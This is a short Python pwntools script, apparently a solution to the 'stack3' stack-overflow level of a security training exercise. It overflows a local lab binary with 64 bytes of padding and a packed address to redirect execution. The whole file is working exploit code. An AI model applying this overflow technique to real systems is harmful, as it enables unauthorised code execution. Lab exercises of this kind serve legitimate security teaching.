from pwn import *
import struct

context.log_level = 'critical'

p = process('./stack3')

PADDING = bytes('A' * (16*4), 'ascii')
RIP = struct.pack('I', 0x08048424)

p.sendline(PADDING + RIP)
print(p.recvline().decode('ascii'))
print(p.recvline().decode('ascii'))
